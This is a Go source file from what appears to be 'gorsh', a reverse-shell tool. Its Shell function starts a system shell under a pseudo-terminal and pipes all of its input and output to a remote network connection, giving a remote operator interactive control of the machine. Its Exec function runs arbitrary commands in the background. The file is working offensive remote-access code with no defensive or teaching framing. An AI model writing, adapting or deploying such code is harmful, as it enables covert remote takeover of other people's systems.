package cmds

import (
	"fmt"
	"io"
	"syscall"

	"git.hyrule.link/blink/gorsh/pkg/myconn"
	"git.hyrule.link/blink/gorsh/pkg/shell"
	"github.com/abiosoft/ishell"
	"github.com/creack/pty"
)

func Shell(c *ishell.Context) {
	cmd := shell.GetShell()

	cmd.Stderr = myconn.Conn
	cmd.Stdin = myconn.Conn
	cmd.Stdout = myconn.Conn

	attrs := &syscall.SysProcAttr{
		Ctty:       3,
		Foreground: true,
	}

	ptmx, err := pty.StartWithAttrs(cmd, nil, attrs)
	// ptmx, err := pty.Start(cmd)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer ptmx.Close()

	// send stdout to the remote conn
	go func() { io.Copy(myconn.Conn, ptmx) }()

	// wait for commands or EOF from conn
	for {
		io.Copy(ptmx, myconn.Conn)
	}
}

func Exec(c *ishell.Context) {
	if len(c.Args) < 1 {
		c.Println("Usage: shell <cmd> [args]")
		return
	}

	_, err := shell.BGExec(c.Args[0], c.Args[1:])
	if err != nil {
		c.Printf("couldn't start: %s\n", err)
		return
	}
}

// // GetFdFromConn get net.Conn's file descriptor.
// func GetFdFromConn(l myconn.Writer) int {
// 	v := reflect.ValueOf(l)
// 	netFD := reflect.Indirect(reflect.Indirect(v).FieldByName("fd"))
// 	fd := int(netFD.FieldByName("sysfd").Int())
// 	return fd
// }
